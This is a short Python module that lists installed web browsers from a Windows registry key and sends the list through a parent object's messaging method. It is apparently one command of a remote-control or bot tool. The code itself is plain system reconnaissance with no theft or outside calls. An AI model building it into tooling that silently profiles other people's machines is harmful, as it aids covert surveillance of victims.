from winreg import *
class Browsers():
	def __init__(self, _):
		self._ = _
		self.args = _.args
		self.Main()

	def Main(self):
		browsers = ""
		with OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Clients\StartMenuInternet") as k:
			for i in range(1024):
				try:
					borwser = (EnumKey(k, i))
					if borwser.startswith("Firefox"):
						borwser = "Firefox"
					elif borwser == "IEXPLORE.EXE":
						borwser = "Internet Explorer"
				except:
					break
				browsers += "%E2%9D%96 " + borwser + "\n"
		browsers = browsers.replace("\n\n","\n")
		self._.Send_Message(browsers)
